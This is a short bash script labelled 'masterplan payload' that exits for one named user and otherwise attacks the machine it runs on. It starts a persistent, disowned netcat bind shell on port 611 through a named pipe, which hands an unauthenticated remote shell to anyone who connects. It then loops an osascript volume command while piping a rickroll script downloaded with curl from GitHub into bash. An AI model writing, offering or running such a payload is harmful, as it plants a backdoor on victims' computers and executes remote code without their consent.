#!/bin/bash

# ------------------ #
# masterplan payload #
# ------------------ #

if [ "$USER" == "jmuhlber" ]; then
	echo "ne ne ne"
	exit 1
fi

echo "if ! lsof -i :611 >/dev/null; then while true; do rm -f /tmp/f; mkfifo /tmp/f; nc -l 611 0</tmp/f | bash 1>/tmp/f 2>&1; done & disown; fi" | { bash; }
echo "i() { while true; do osascript -e 'set Volume 0'; sleep 0.01; done; }; iii() { i & ii=$!; }; iii && curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash; kill $ii" | bash
